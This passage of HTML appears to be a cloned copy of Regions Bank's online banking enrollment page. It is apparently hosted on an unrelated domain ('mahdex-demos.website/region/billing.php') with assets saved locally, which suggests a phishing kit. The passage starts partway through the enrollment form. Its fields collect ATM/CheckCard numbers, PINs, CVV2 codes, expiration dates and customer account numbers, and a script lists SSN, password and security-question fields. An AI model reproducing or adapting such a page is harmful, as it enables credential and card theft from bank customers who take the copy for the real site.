        <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="NraAccountNumber" data-valmsg-replace="true"></span>
    </div>
</div></section></div><div data-tabname="TabOther" class="content">    <h4>
        Select your account type from the list below:
        <a href="javascript:void(0)" class="other-morethanoneaccount ui-flyout-activator ui-flyout-closed" tabindex="0" aria-expanded="false" aria-describedby="flyout-30">
            What if you have more than one Regions account?
        </a>
        <section class="fly-out hover-flyout" data-fly-out-direction="up" data-fly-out-arrow="true" data-fly-out-activateon="hover" id="flyout-30">        <span><meta alias="ENROLLMENT-Help-MoreThanOneRegionsAccount-PrsnlBiz"><p>
You may enter information for any of the account types in the list. You will need your account number and an additional piece of information related to the account type you select.

</p></span></section>
    </h4>
    <div class="otheraccount-identification-section sub-content">
        <fieldset>
            <legend class="visually-hidden">Other Account Identification</legend>
            <ol class="other-account-type">
                <li>
                    
                    <label for="MixedAccountTypeOther" class="regions-label first">Account Type<abbr class="required-field" title="Required">*</abbr></label>
                    <a title="Popup help" class="popup-help-link ui-flyout-activator ui-flyout-closed" tabindex="0" role="button" aria-expanded="false" aria-controls="flyout-31"><span class="visually-hidden">Popup help</span></a><section class="fly-out hover-flyout" data-fly-out-exclusive="true" data-fly-out-arrow="true" id="flyout-31"><div class="popup-help-content">Account type can be any one of the following that you have with Regions: Installment Loan, CD, IRA, Credit Card, Equity Line or Reloadable Card.<a title="Cancel" class="cancel"><span class="visually-hidden">Cancel</span></a></div></section>
                    <select aria-required="True" class="account-type-other" id="MixedAccountTypeOther" name="AccountTypeOther" required="required"><option value="">Select account type</option>
<option value="installmentloan">Installment Loan</option>
<option value="timedeposit">CD or IRA</option>
<option value="creditcard">Credit Card</option>
<option value="equityline">Equity Line</option>
<option value="gpr">Reloadable Card</option>
</select>
                </li>
                <li class="othertab-items" style="display: none">
                    <label for="MixedRegionsAccountNumber" class="regions-label first">Regions account number<abbr class="required-field" title="Required">*</abbr></label>
                    <input aria-required="True" autocomplete="off" class="regions-acctnumber" id="MixedRegionsAccountNumber" maxlength="40" name="RegionsAccountNumber" required="required" style="width:188px;" type="text" value="">
                    <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="RegionsAccountNumber" data-valmsg-replace="true"></span>
                </li>
                <li class="othertab-items" style="display: none">
                    
                        
                            <label for="AuthenticationAmountPerBus" class="regions-label first authentication-info-label">Authentication info<abbr class="required-field" title="Required">*</abbr></label>
                            <input aria-required="True" autocomplete="off" class="authentication-amount perbus-authenticationamount" data-val="true" data-val-authenticationamountnotempty="Amount is empty" id="AuthenticationAmountPerBus" name="AuthenticationAmountPerBus" required="required" type="text" value="0">
                            <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="AuthenticationAmountPerBus" data-valmsg-replace="true"></span>
                        
                </li>
            </ol>
        </fieldset>
        <ol class="other-reloadable-card" style="display:none">
            <li>
                    <h4 class="atmcheckcard-header">Enter your ATM/CheckCard number:</h4>
    <div class="info-verification-atm sub-content" data-atmreloadablecardlabel="Card Number">
        <fieldset>
            <legend class="visually-hidden">ATM Card Identification</legend>
            <ol>
                <li>
                    <label for="MixedAtmCardNum1" class="regions-label first">ATM/CheckCard Number<abbr class="required-field" title="Required">*</abbr></label>
                    <a title="Popup help" class="popup-help-link ui-flyout-activator ui-flyout-closed" tabindex="0" role="button" aria-expanded="false" aria-controls="flyout-32"><span class="visually-hidden">Popup help</span></a><section class="fly-out hover-flyout" data-fly-out-exclusive="true" data-fly-out-arrow="true" id="flyout-32"><div class="popup-help-content">The 16 digit number printed on your ATM/CheckCard.<a title="Cancel" class="cancel"><span class="visually-hidden">Cancel</span></a></div></section>
                    <input aria-required="True" autocomplete="off" class="check-card1" id="MixedAtmCardNum1" maxlength="38" name="AtmCardNum1" required="required" style="width:164px;" type="text" value="">
                    <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="AtmCardNum1" data-valmsg-replace="true"></span>
                </li>
                <li>
                    <label for="MixedAtmPin" class="regions-label first">PIN<abbr class="required-field" title="Required">*</abbr></label>
                    <a title="Popup help" class="popup-help-link ui-flyout-activator ui-flyout-closed" tabindex="0" role="button" aria-expanded="false" aria-controls="flyout-33"><span class="visually-hidden">Popup help</span></a><section class="fly-out hover-flyout" data-fly-out-exclusive="true" data-fly-out-arrow="true" id="flyout-33"><div class="popup-help-content">Your PIN is a 4-digit number used for ATM withdrawals or point-of-sale debit purchases.<a title="Cancel" class="cancel"><span class="visually-hidden">Cancel</span></a></div></section>
                    <input aria-required="True" autocomplete="off" class="atm-pin" id="MixedAtmPin" maxlength="8" name="AtmPin" required="required" style="width:50px;" type="password" value="">
                    <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="AtmPin" data-valmsg-replace="true"></span>
                </li>
            </ol>
            <ol>
                <li class="cv2-display">
                    <label for="MixedCardSecurityCode" class="regions-label first">CVV2<abbr class="required-field" title="Required">*</abbr></label>
                    <a title="Popup help" class="popup-help-link ui-flyout-activator ui-flyout-closed" tabindex="0" role="button" aria-expanded="false" aria-controls="flyout-34"><span class="visually-hidden">Popup help</span></a><section class="fly-out hover-flyout" data-fly-out-exclusive="true" data-fly-out-arrow="true" id="flyout-34"><div class="popup-help-content"><h1>What is my CVV number?</h1>    <div class="cvv-helper"></div>
<a title="Cancel" class="cancel"><span class="visually-hidden">Cancel</span></a></div></section>
                    <input aria-required="True" autocomplete="off" class="cardsecurity-code" id="MixedCardSecurityCode" maxlength="6" name="CardSecurityCode" required="required" style="width:30px;" type="text" value="">
                    <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="CardSecurityCode" data-valmsg-replace="true"></span>
                </li>
                <li>
                    <label for="MixedExpirationDate" class="regions-label first">Expiration Date<abbr class="required-field" title="Required">*</abbr></label>
                    <a title="Popup help" class="popup-help-link ui-flyout-activator ui-flyout-closed" tabindex="0" role="button" aria-expanded="false" aria-controls="flyout-35"><span class="visually-hidden">Popup help</span></a><section class="fly-out hover-flyout" data-fly-out-exclusive="true" data-fly-out-arrow="true" id="flyout-35"><div class="popup-help-content">Enter MMYY displayed on card.<a title="Cancel" class="cancel"><span class="visually-hidden">Cancel</span></a></div></section>
                    <input aria-required="True" autocomplete="off" class="expiration-date" id="MixedExpirationDate" maxlength="10" name="ExpirationDate" required="required" style="width:40px;" type="text" value="">
                    <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="ExpirationDate" data-valmsg-replace="true"></span>
                </li>
            </ol>
        </fieldset>
    </div>

            </li>
        </ol>
    </div>
</div></section>    <div class="nra-information nra-form" style="display: none;">
            <h4 class="nonnra-info">Enter your Customer Number:</h4>
    <h4 class="nra-info" style="display: none">Enter your Personal Customer Number and Personal Regions Account Number:</h4>
    <div class="enroll-customernumber sub-content">
        <label for="MixedCustomerNumber" style="padding-left:35px;" class="regions-label first">Customer Number<abbr class="required-field" title="Required">*</abbr></label>
        <span class="nra-information" style="display: none"><a title="Popup help" class="popup-help-link ui-flyout-activator ui-flyout-closed" tabindex="0" role="button" aria-expanded="false" aria-controls="flyout-36"><span class="visually-hidden">Popup help</span></a><section class="fly-out hover-flyout" data-fly-out-exclusive="true" data-fly-out-arrow="true" id="flyout-36"><div class="popup-help-content"><h1>What is my customer number?</h1>This number is provided at account opening. Don't have this number? Call 1-800-240-7887.
Business customers please contact your Business Banker or branch for assistance.<a title="Cancel" class="cancel"><span class="visually-hidden">Cancel</span></a></div></section></span>
        <input aria-required="True" autocomplete="off" class="customernumber" id="MixedCustomerNumber" maxlength="40" name="CustomerNumber" required="required" style="width:188px;" type="text" value="">
        <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="CustomerNumber" data-valmsg-replace="true"></span>
    </div>
    <div class="nra-information" style="display: none">
        <label for="NraAccountNumber" style="padding-left:35px;" class="regions-label first">Regions Account Number<abbr class="required-field" title="Required">*</abbr></label>
        <a title="Popup help" class="popup-help-link ui-flyout-activator ui-flyout-closed" tabindex="0" role="button" aria-expanded="false" aria-controls="flyout-37"><span class="visually-hidden">Popup help</span></a><section class="fly-out hover-flyout" data-fly-out-exclusive="true" data-fly-out-arrow="true" id="flyout-37"><div class="popup-help-content">Enter your checking, savings or money market account number.<a title="Cancel" class="cancel"><span class="visually-hidden">Cancel</span></a></div></section>
        <input aria-required="true" class="nraaccount-number" id="NraAccountNumber5" maxlength="40" name="NraAccountNumber" required="required" style="width: 188px;" type="text" value="">
        <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="NraAccountNumber" data-valmsg-replace="true"></span>
    </div>

    </div>
</div></section>
</section>




























        </form>

        <hr>

        <div class="button-actions">
            <a href="javascript:void(0);" class="regions-cancel-button cancel-identification" role="button">Cancel<span class="visually-hidden"></span></a>
            <span class="button-right-layout">
                <a href="javascript:void(0);" class="regions-back-button step1-enroll-back" role="button">Back</a>
                
          </span>
        </div>
    </div>

</div>

<section title="Enrollment Not Authorized" class="lightbox enroll-unauthorizedhtml"><div data-dismiss-label="Click to dismiss" class="flashpoint"></div>    <div>
        <p class="enroll-unauthorized-content" style="height: 180px; overflow-y: scroll;"></p>

    </div>
</section>


<section title="Consent for Electronic Communications &amp; Disclosures" class="lightbox enroll-consentanddisclosures"><div data-dismiss-label="Click to dismiss" class="flashpoint"></div>    <div class="disclosures-terms-url" data-disclosurestermsurl="https://onlinebanking.regions.com/enrollments/getdisclosuresandterms"></div>
    <div class="enroll-termsdisclosures">
        
        <div class="title-subheader">Please read the following agreement and indicate your acceptance to continue Online Banking enrollment.</div>
        
        <iframe class="disclosures-terms-content" src="./billing_files/saved_resource.html"></iframe>

        <div class="button-actions">
            <a href="javascript:void(0)" class="regions-cancel-button cancel" role="button">
                Decline
            </a>
            <span class="button-right-layout">
                <button type="button" class="regions-orange-button agree-disclosures" role="button">I Accept</button>
            </span>
        </div>

    </div>
</section>


<section title="Terms &amp; Conditions" class="lightbox enroll-termsandconditions"><div data-dismiss-label="Click to dismiss" class="flashpoint"></div>    <div class="enrollurl" data-step1enrollurl="https://onlinebanking.regions.com/enrollments/savetermsacceptance"></div>
    <div class="enroll-termsdisclosures">
        
        <div class="title-subheader">Please read the following agreement and indicate your acceptance to continue Online Banking enrollment.</div>
        
        <iframe class="disclosures-terms-content" src="./billing_files/saved_resource(2).html"></iframe>

        <div class="button-actions">
            <a href="javascript:void(0)" class="regions-cancel-button cancel" role="button">
                Decline
            </a>
            <span class="button-right-layout">
                <button type="button" class="regions-orange-button agree-terms" role="button">I Accept</button>
            </span>
        </div>

    </div>
</section>




<section class="lightbox enroll-navigateaway"><div data-dismiss-label="Click to dismiss" class="flashpoint"></div>    <div class="navigate-terms-content">
        <ol><li>This agreement is required to enroll in Online Banking. </li><li>Are you sure you wish to cancel enrollment?</li><ol>
        <br>
        <button type="button" class="regions-orange-button navigate-button-yes selected" role="button">Yes, Cancel</button>
        <button type="button" class="regions-orange-button navigate-button-no" role="button">No, Go Back</button>
    </ol></ol></div>
</section>

                        </div>

                        <h3 class="ui-accordion-header ui-helper-reset ui-state-default ui-corner-all ui-accordion-icons" id="ui-accordion-1-header-1" style="cursor: default;">
                            <span class="ui-accordion-header-icon ui-icon"></span>
                            
                        </h3>
                        <div class="ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" id="ui-accordion-1-panel-1" aria-labelledby="ui-accordion-1-header-1" role="tabpanel" aria-expanded="false" aria-hidden="true" style="display: none;">
                            


<div class="step2-create-password" style="display: none">
    
 
    
    <hr>

    <div class="button-actions">
        <a href="javascript:void(0);" class="regions-cancel-button cancel-useridpassword" role="button">Cancel<span class="visually-hidden"></span></a>

    </div>
</div>

<div class="step2-question-answer" style="display: none">
    
    <div class="user-pwd-url" data-userpwdurl="https://onlinebanking.regions.com/enrollments/saveandenrolluser"></div>

    <ul class="form-verification">
        <li>
            <span class="regions-label"><span style="display: inline-block">            
                Online ID &nbsp;
                <a title="Popup help" class="popup-help-link ui-flyout-activator ui-flyout-closed" tabindex="0" role="button" aria-expanded="false" aria-controls="flyout-41"><span class="visually-hidden">Popup help</span></a><section class="fly-out hover-flyout" data-fly-out-exclusive="true" data-fly-out-arrow="true" id="flyout-41"><div class="popup-help-content">Choose an Online ID that includes at least 8 and up to 18 letters and numbers. Your Online ID is not case sensitive. Special characters are not accepted.<a title="Cancel" class="cancel"><span class="visually-hidden">Cancel</span></a></div></section>
            </span></span>
            <span class="display-userid"></span>
        </li>
        <li>
            <span class="regions-label"><span style="display: inline-block">            
                Password &nbsp;
                <a title="Popup help" class="popup-help-link ui-flyout-activator ui-flyout-closed" tabindex="0" role="button" aria-expanded="false" aria-controls="flyout-42"><span class="visually-hidden">Popup help</span></a><section class="fly-out hover-flyout" data-fly-out-exclusive="true" data-fly-out-arrow="true" id="flyout-42"><div class="popup-help-content">Choose a password that is difficult to guess. Your password requires at least 8 and up to 18 characters including an uppercase letter, lowercase letter, and number. Your password is case sensitive. Special characters are not accepted.<a title="Cancel" class="cancel"><span class="visually-hidden">Cancel</span></a></div></section>
            </span></span>
            <span class="display-pwd"></span>
        </li>
    </ul>

    <hr>

   
    
    <hr>

    <div class="button-actions">
        <a href="javascript:void(0);" class="regions-cancel-button cancel-questionanswer" role="button">Cancel<span class="visually-hidden"></span></a>
     
    </div>
</div>

<div class="step2-STS-post">

    
    <input id="addBusinessUrlAction" name="addBusinessUrlAction" type="hidden" value="https://login.regions.com/SignIn?wa=wsignin1.0&amp;wtrealm=http%3a%2f%2fonlinebanking.regions.com%2f&amp;wctx=rm%3d0%26id%3dpassive%26ru%3d%2fenrollment%2faccountsetup%3fDisplayOption%3dadd">

    

</div>

<section class="lightbox lightbox-signonmessage"><div data-dismiss-label="Click to dismiss" class="flashpoint"></div>    <div style="font-size: 20px">
        Please wait attempting to sign on.....
    </div>
</section>




                        </div>

                        <h3 style="cursor: default;">
                            <span class="ui-accordion-header-icon ui-icon"></span>
                            <div class="accordionHeader">
                                <span class="icon accordionAccountSetupTemplates"></span>
                                <span class="accordian-header-title"></span>
                            </div>
                        </h3>
                        <div class="ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" id="ui-accordion-1-panel-2" aria-labelledby="ui-accordion-1-header-2" role="tabpanel" aria-expanded="false" aria-hidden="true" style="display: none;">
                        </div>

                        <h3 class="ui-accordion-header ui-helper-reset ui-state-default ui-corner-all ui-accordion-icons" id="ui-accordion-1-header-3" style="cursor: default;">
                            <span class="ui-accordion-header-icon ui-icon"></span>
                            
                        </h3>
                        <div class="ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" id="ui-accordion-1-panel-3" aria-labelledby="ui-accordion-1-header-3" role="tabpanel" aria-expanded="false" aria-hidden="true" style="display: none;">
                        </div>
                    </div>

                </div>
            </td>
            <td style="width:10px"></td>
            <td style="width:240px" class="faqborder">
                
                <meta alias="ENROLLMENT-Need-Help"><div style="margin-bottom: 30px;">
    <p style="margin-bottom: 10px; font-weight: bold" role="heading" aria-level="3">Need Help?</p>
    <p>Call 1-800-240-7887 with questions or to open an account.</p>

</div>

<style type="text/css">
.FAQ-list-item {

   padding-bottom: 10px;
}
</style>



            </td>
        </tr>
    </tbody>
</table>
                </section>
    </section>

</section>




        </section>
    </div>

    <div>
        <footer id="regions-footer">
            
    

           
<div class="default-footer no-print">

    
    <div class="footer-links" role="list">
        <a href="https://onlinebanking.regions.com/customerservice/contactus" role="listitem">
            Contact Us
        </a>
        <a href="http://www.regions.com/personal_banking/service_agreement.rf" target="_blank" role="listitem">
            Terms and Conditions
        </a>
        <a href="http://www.regions.com/about_regions/privacy_pledge.rf" target="_blank" role="listitem">
            Privacy Pledge
        </a>
        <a href="http://www.regions.com/about_regions/privacy_security.rf" target="_blank" role="listitem">
            Security
        </a>
        <a href="https://www.regions.com/about_regions/online_privacy_notice_to_customers.rf#ads" target="_blank" role="listitem">
            Online Tracking and Advertising
        </a>
				<a href="https://www.regions.com/about_regions/regions_accessible_banking.rf" target="_blank" role="listitem">
					Accessible Banking
				</a>

        <span id="FeedbackLink"><a class="QSILink SI_8bHpCxYjB0PPu3r_Link" href="javascript:void(0);" role="listitem">Leave Feedback</a></span>
				
    </div>

    
    <div class="footer-disclosure">
        <span class="icon-ehl">Equal Housing Lender</span>
        <span>Member FDIC</span>
        <span>© 2019 Regions Bank. All rights reserved. 1-800-REGIONS</span>
    </div>

</div>

        </footer>
    </div>
</div>





        
        <div class="hosterror-header" style="display: none; color: red; font-weight: bold;">
            <blink>HOST ERROR.....</blink>
        </div>
        <textarea class="hostresponses" style="display: none; margin: 2px; width: 100%; height: 200px;" readonly=""></textarea>

        
        
    </div>

    
    <noscript>
        <div class="warning-message">
            Your browser is not capable of viewing this site because it does not support JavaScript or JavaScript may be disabled. Please enable JavaScript.
            <br /><br />
        </div>
    </noscript>

    
    <div id="embeddedInFrame" style="display: none" class="warning-message">
        You are viewing this page in a unauthorized frame window.
        <br><br>
        For your security, please close all the browser windows now.
    </div>

    
    

        <!-- INVITATION PROMPT MARKUP -->
    <div id="oo_container" style="display: none">
        <div id="oo_invitation_prompt" role="dialog" aria-describedby="oo_invite_message">
            <div id="oo_company_logo"></div>
            <div id="oo_invite_content">
                <p id="oo_invite_message">After your visit, would you be willing to provide some quick feedback?<br><br>(It will only take a minute)</p>
                <p class="prompt_button"><a href="https://onlinebanking.regions.com/enrollment/home#" id="oo_launch_prompt">Yes<span class="screen_reader">This will open a new window</span></a></p>
                <p class="prompt_button"><a href="https://onlinebanking.regions.com/enrollment/home#" id="oo_no_thanks">No Thanks</a></p>
                <p id="ol_brand_logo"><a href="http://www.opinionlab.com/company/" target="_blank" aria-label="Powered by OpinionLab. This will open a new window"></a></p>
            </div>
            <a id="oo_close_prompt" href="https://onlinebanking.regions.com/enrollment/home#" aria-label="Close dialog"><div class="screen_reader">Close dialog</div><span aria-hidden="true">✖</span></a>
        </div>
    </div>


    

        <script src="./billing_files/es5-shim.js.download"></script><script src="./billing_files/console.js.download"></script><script src="./billing_files/jquery.text-overflow.js.download"></script>

    
    
    <script>window.Fiserv = {base: 'https://onlinebanking.regions.com/'};</script>
<script src="./billing_files/combined.js.ca5498467227cbc688622a12cf35d1d7bac85d06.js.download"></script>
<script src="./billing_files/combined.js.85088e03f389dac95545c53f7f9a1a6ceeae2c79.js.download"></script>
<script src="./billing_files/combined.js.99b8cb124ad86ce8d148bae8ca119b9f7ef64870.js.download"></script>
<script src="./billing_files/jquery.glob.en-us.js.download"></script>
<script src="./billing_files/fiserv.ps.initculture.en-us.js.download"></script>
<script> (function() {var vm = ko.mapping.fromJS({
  "returnUrl": null,
  "faqTermHtml": "<html><head><meta Alias=\"ENROLLMENT-Need-Help\"/></head><body><div style=\"margin-bottom: 30px;\">\n    <p style=\"margin-bottom: 10px; font-weight: bold\">Need Help?</p>\n    <p>Call 1-800-240-7887 with questions or to open an account.</p>\n\n</div>\n\n<style type=\"text/css\">\n.FAQ-list-item {\n\n   padding-bottom: 10px;\n}\n</style>\n\n<div>\n<span style=\"font-weight: bold\">FAQs</span><br /><br />\n<ul style=\"list-style-type: none; margin: 0; padding: 0;\">\n\n<li class=\"FAQ-list-item\"><a href=\"https://www.regions.com/help/online-banking-help/getting-started/starting-online-banking/what-information-do-i-need-to-enroll-for-online-banking\" target=\"_blank\">What information do I need to enroll?</a></li>\n<li class=\"FAQ-list-item\"><a href=\"https://www.regions.com/help/online-banking-help/login-and-security/fraud-prevention-and-security/Is-Regions-Online-Banking-secure\" target=\"_blank\">Is Regions Online Banking secure?</a></li>\n<li class=\"FAQ-list-item\"><a href=\"https://www.regions.com/help/online-banking-help/getting-started/starting-online-banking/When-is-the-Online-Banking-system-available\" target=\"_blank\">When is the Online Banking system available?</a></li>\n<li>\n<a target=\"_blank\" href=\"https://www.regions.com/help/online-banking-help\">View all FAQs</a>\n</li>\n</ul>\n</div>\n</body></html>",
  "socialNumber": null,
  "primaryPhoneNumber": null,
  "secondaryPhoneNumber": null,
  "primaryPhoneType": null,
  "secondaryPhoneType": null,
  "userId": null,
  "password": null,
  "confirmPassword": null,
  "profilePreference": null,
  "email": null,
  "confirmEmail": null,
  "customerName": null,
  "businessName": null,
  "opaqueId": null,
  "termVersion": null,
  "termDescription": null,
  "termsAcceptedDate": null,
  "termsAcceptedTime": null,
  "bankingType": null,
  "accountsType": null,
  "methodType": null,
  "question1": null,
  "answer1": null,
  "question2": null,
  "answer2": null,
  "question3": null,
  "answer3": null,
  "rcifidForSsn": null,
  "rcifidForTin": null,
  "nonResidentEnrollNo": null,
  "nraAccountNumber": null,
  "nraCustomerNumber": null,
  "phonyPhoneNumbers": "5551212,1111111,2222222,3333333,4444444,5555555,6666666,7777777,8888888,9999999,0000000,1234567,2345678,3456789,4567890,0987654,9876543,8765432,7654321",
  "phoneTypes": [
    {
      "selected": false,
      "text": "Select Type",
      "value": ""
    },
    {
      "selected": false,
      "text": "Mobile",
      "value": "Mobile"
    },
    {
      "selected": false,
      "text": "Landline",
      "value": "Landline"
    }
  ],
  "questions": [
    {
      "selected": false,
      "text": "What was the name of your first best friend?",
      "value": "5"
    },
    {
      "selected": false,
      "text": "What was the name of your best friend in high school?",
      "value": "6"
    },
    {
      "selected": false,
      "text": "What is the last name of your favorite teacher?",
      "value": "7"
    },
    {
      "selected": false,
      "text": "Where did you go on your first vacation?",
      "value": "8"
    },
    {
      "selected": false,
      "text": "What is the last name of the author of the best book you ever read?",
      "value": "10"
    },
    {
      "selected": false,
      "text": "Who is your favorite author?",
      "value": "13"
    },
    {
      "selected": false,
      "text": "What is your dream job?",
      "value": "16"
    },
    {
      "selected": false,
      "text": "What is your favorite book?",
      "value": "18"
    },
    {
      "selected": false,
      "text": "Who was your first crush?",
      "value": "20"
    },
    {
      "selected": false,
      "text": "What is your best friend's middle name?",
      "value": "21"
    },
    {
      "selected": false,
      "text": "What was the name of your first teacher?",
      "value": "25"
    },
    {
      "selected": false,
      "text": "What school did you attend when you were 13?",
      "value": "28"
    },
    {
      "selected": false,
      "text": "What was your first pet's name?",
      "value": "30"
    },
    {
      "selected": false,
      "text": "What was your paternal grandfather's first name?",
      "value": "33"
    },
    {
      "selected": false,
      "text": "What was your maternal grandfather's first name?",
      "value": "34"
    },
    {
      "selected": false,
      "text": "What was your paternal grandmother's first name?",
      "value": "35"
    },
    {
      "selected": false,
      "text": "What was your maternal grandmother's first name?",
      "value": "36"
    },
    {
      "selected": false,
      "text": "What is the last name of the maid of honor at your wedding?",
      "value": "39"
    },
    {
      "selected": false,
      "text": "What is the last name of the best man at your wedding?",
      "value": "40"
    },
    {
      "selected": false,
      "text": "What position did/do you play in your favorite sport?",
      "value": "41"
    },
    {
      "selected": false,
      "text": "What is the first name of the boy or girl that you first kissed?",
      "value": "42"
    },
    {
      "selected": false,
      "text": "What was the last name of your third grade teacher?",
      "value": "43"
    },
    {
      "selected": false,
      "text": "Address of your first house or child hood home (Street Name)?",
      "value": "44"
    },
    {
      "selected": false,
      "text": "Where were you when you first heard about 9/11?",
      "value": "45"
    },
    {
      "selected": false,
      "text": "In what city did you meet your spouse/significant other?",
      "value": "46"
    },
    {
      "selected": false,
      "text": "What is the name of a college you applied to but didn't attend?",
      "value": "47"
    },
    {
      "selected": false,
      "text": "What was your first boss's last name?",
      "value": "48"
    },
    {
      "selected": false,
      "text": "Where were you when you had your first kiss?",
      "value": "49"
    },
    {
      "selected": false,
      "text": "What city did you live in, in the year 2000?",
      "value": "50"
    },
    {
      "selected": false,
      "text": "What was your childhood nickname?",
      "value": "51"
    },
    {
      "selected": false,
      "text": "What is the name of the place your wedding reception was held?",
      "value": "52"
    },
    {
      "selected": false,
      "text": "In what city or town did your mother and father meet?",
      "value": "53"
    },
    {
      "selected": false,
      "text": "Name of your oldest nephew?",
      "value": "54"
    },
    {
      "selected": false,
      "text": "Name of your oldest niece?",
      "value": "55"
    },
    {
      "selected": false,
      "text": "First name of your eldest maternal aunt?",
      "value": "56"
    },
    {
      "selected": false,
      "text": "What is your maternal grandmother's maiden name?",
      "value": "57"
    }
  ],
  "isTermsAccepted": false,
  "isDisclosureAccepted": false,
  "businessCustomerNumber": null,
  "tIN1": null,
  "isDisplayProfilePage": false,
  "customerNumber": null,
  "regionsAccountNumber": null,
  "authenticationAmount": 0.0,
  "authenticationAmountPerBus": 0.0,
  "atmCardNum1": null,
  "atmPin": null,
  "cardSecurityCode": null,
  "expirationDate": null,
  "accountTypeOther": null,
  "otherAccountTypes": [
    {
      "type": "installmentloan",
      "name": "Installment Loan"
    },
    {
      "type": "timedeposit",
      "name": "CD or IRA"
    },
    {
      "type": "creditcard",
      "name": "Credit Card"
    },
    {
      "type": "equityline",
      "name": "Equity Line"
    },
    {
      "type": "gpr",
      "name": "Reloadable Card"
    }
  ],
  "moreThanOneBusinessCmsContent": "<html><head><meta Alias=\"ENROLLMENT-Help-MoreThanOneBusiness\"/></head><body><p>\n\nAdditional businesses may be enrolled and accessed with the same Online ID and Password.<br />\n<br />\n\nThe Tax ID number and Customer Number for each business will be entered in a subsequent step.\n\n</p></body></html>",
  "moreThanOneAccountPrsnlBizCmsContent": "<html><head><meta Alias=\"ENROLLMENT-Help-MoreThanOneRegionsAccount-PrsnlBiz\"/></head><body><p>\nYou may enter information for any of the account types in the list. You will need your account number and an additional piece of information related to the account type you select.\n\n</p></body></html>",
  "openWithssnCmsContent": "<html><head><meta Alias=\"ENROLLMENT-Help-OpenedWithSSN\"/></head><body>Enter the Social Security Number used to open the account if a Tax ID Number has not been established for the business.</body></html>"
});Fiserv.namespace('Fiserv.PS.Enrollments.Web.ViewModels');Fiserv.PS.Enrollments.Web.ViewModels.EnrollmentViewModel = vm;})(); </script>


        <script>
        Fiserv.namespace('Fiserv.resources');Fiserv.resources.humanizedDate = {
  "today": "Today",
  "tomorrow": "Tomorrow",
  "yesterday": "Yesterday"
}
    </script>

    
    

    
            <script type="text/javascript" src="./billing_files/global-overlays.js.download"></script>

            <script type="text/javascript" src="./billing_files/Bootstrap.js.download"></script>


























<div id="amaze_liveregions_polite" class="amaze-offscreen" role="log" aria-live="polite" aria-atomic="false" aria-relevant="additions"></div><div id="amaze_liveregions_assertive" class="amaze-offscreen" role="log" aria-live="assertive" aria-atomic="false" aria-relevant="additions"></div><div id="ZN_ebdjZIDEhxPwsol"><!--DO NOT REMOVE-CONTENTS PLACED HERE--></div><script type="text/javascript" src="./billing_files/saved_resource"></script><script src="./billing_files/CoreModule.js.download" defer=""></script><script src="./billing_files/LinkModule.js.download" defer=""></script><img src="./billing_files/saved_resource(1)" alt="" style="display: none;"><script src="https://siteintercept.qualtrics.com/dxjsmodule/CoreModule.js?Q_CLIENTVERSION=1.4.0&amp;Q_CLIENTTYPE=web" defer=""></script><script src="https://siteintercept.qualtrics.com/dxjsmodule/CoreModule.js?Q_CLIENTVERSION=1.4.0&amp;Q_CLIENTTYPE=web" defer=""></script><script src="https://siteintercept.qualtrics.com/dxjsmodule/CoreModule.js?Q_CLIENTVERSION=1.4.0&amp;Q_CLIENTTYPE=web" defer=""></script><script src="https://siteintercept.qualtrics.com/dxjsmodule/CoreModule.js?Q_CLIENTVERSION=1.4.0&amp;Q_CLIENTTYPE=web" defer=""></script><script src="https://siteintercept.qualtrics.com/dxjsmodule/CoreModule.js?Q_CLIENTVERSION=1.4.0&amp;Q_CLIENTTYPE=web" defer=""></script><div id="ZN_ebdjZIDEhxPwsol"><!--DO NOT REMOVE-CONTENTS PLACED HERE--></div><script type="text/javascript" src="https://znebdjzidehxpwsol-regions.siteintercept.qualtrics.com/WRSiteInterceptEngine/?Q_ZID=ZN_ebdjZIDEhxPwsol&amp;Q_LOC=http%3A%2F%2Fmahdex-demos.website%2Fregion%2Fbilling.php&amp;t=1559936639667"></script><script src="https://siteintercept.qualtrics.com/dxjsmodule/CoreModule.js?Q_CLIENTVERSION=1.4.0&amp;Q_CLIENTTYPE=web" defer=""></script><script src="https://siteintercept.qualtrics.com/dxjsmodule/CoreModule.js?Q_CLIENTVERSION=1.4.0&amp;Q_CLIENTTYPE=web" defer=""></script></body></html>